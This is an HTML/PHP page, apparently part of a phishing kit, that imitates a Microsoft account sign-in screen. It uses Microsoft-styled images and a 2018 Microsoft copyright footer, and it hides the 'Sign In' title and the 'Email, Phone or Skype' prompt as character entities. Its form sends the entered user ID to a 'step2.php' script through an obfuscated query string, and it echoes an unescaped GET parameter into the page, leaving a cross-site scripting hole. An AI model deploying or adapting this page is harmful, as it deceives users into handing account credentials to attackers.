<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
              <link href="css/conv.min.css" rel="stylesheet" />

			  <style type="text/css">
  .textbox {
    padding-left: 0px;
    height: 36px;
    color: #333;
    border: none;
    border-bottom: 1px solid #666;
   font-size: 15px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    outline: none;
}
.textbox:focus {
    background: #fff;
    border-bottom: 1px solid #0067B8;
}
 </style>
<!--<style type="text/css">
 .textbox {
    height: 36px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 1px solid #666;
    
    
}
 .textbox:focus {
    border-color: #4488cc;
	border-style: solid;   
    border-width: 1px;
    outline: 0;
}
 </style> -->
<style type="text/css">
div#container
{
	position:relative;
	width: 1366px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


</head>
<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;images/small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;images/t1.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div><!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <div class="background-overlay"></div><!-- /ko --> </div></div>
<body>
<div id="container">
<body  bgColor="#030100">

   <form action=step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid name=aggebhagja id=aggebhagja method=post>
   
<div id="image1" style="position: absolute; overflow: hidden; left: 476px; top: 136px; width: 450px; height: 365px; z-index: 0"><img src="images/lofo.png" alt="" title="" border=0 width=450px height=365></div>
<span style="position: absolute; left: 769px; top: 419px; z-index: 4">
<input type="image" name="formimage1" width="110" height="34" src="images/continue.png">
</span>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#80;&#104;&#111;&#110;&#101;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" autocomplete="off" required  type="text" style="position: absolute; width: 358px; left: 523px; top: 279px; z-index: 3">
<div id="image6" style="position: absolute; overflow: hidden; left: 601px; top: 338px; width: 68px; height: 14px; z-index: 2"><a href="#"><img src="images/m7.png" alt="" title="" border=0 width=68 height=14></a></div>

</div>

<div id="footer"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt" >© 2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div>
</body>
</html>
